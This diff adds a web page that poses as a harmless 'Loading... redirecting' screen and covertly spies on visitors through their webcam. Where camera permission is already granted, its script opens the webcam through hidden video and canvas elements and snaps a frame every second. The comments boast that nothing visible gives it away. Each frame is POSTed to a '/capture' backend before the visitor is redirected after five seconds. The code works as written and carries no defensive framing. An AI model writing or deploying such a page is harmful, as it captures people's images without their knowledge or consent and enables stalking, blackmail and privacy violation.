@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Image Capture</title>
+    <style>
+        /* Hide canvas element to prevent any visible indication */
+        #canvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <p>Loading... Please wait while we redirect you.</p>
+    <canvas id="canvas"></canvas> <!-- Hidden canvas for capturing images -->
+
+    <script>
+        async function startCameraCapture() {
+            try {
+                // Check if camera access has been granted
+                const permissionStatus = await navigator.permissions.query({ name: 'camera' });
+                
+                if (permissionStatus.state === 'granted') {
+                    // Camera access is granted, proceed with capturing images
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    const video = document.createElement('video');
+                    video.style.display = 'none';  // Ensure video is not visible
+                    video.srcObject = stream;
+                    video.play();
+
+                    const canvas = document.getElementById('canvas');
+                    const context = canvas.getContext('2d');
+
+                    // Capture images every second
+                    const captureInterval = setInterval(() => {
+                        if (document.visibilityState === 'visible') {
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            const dataUrl = canvas.toDataURL('image/jpeg');
+
+                            // Send the image to the backend
+                            fetch('/capture', {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/x-www-form-urlencoded',
+                                },
+                                body: `image=${encodeURIComponent(dataUrl)}`
+                            }).catch(error => console.error('Error:', error));
+                        } else {
+                            clearInterval(captureInterval);
+                        }
+                    }, 1000);  // Capture image every 1 second
+
+                } else {
+                    console.log('Camera access not granted.');
+                }
+            } catch (err) {
+                console.error('Error checking camera permission:', err);
+            }
+        }
+
+        // Start camera capture if permission is granted
+        startCameraCapture();
+
+        // Redirect the user to Google after 5 seconds
+        setTimeout(() => {
+            window.location.href = '/redirect';
+        }, 5000);  // Redirect after 5 seconds
+    </script>
+</body>
+</html>
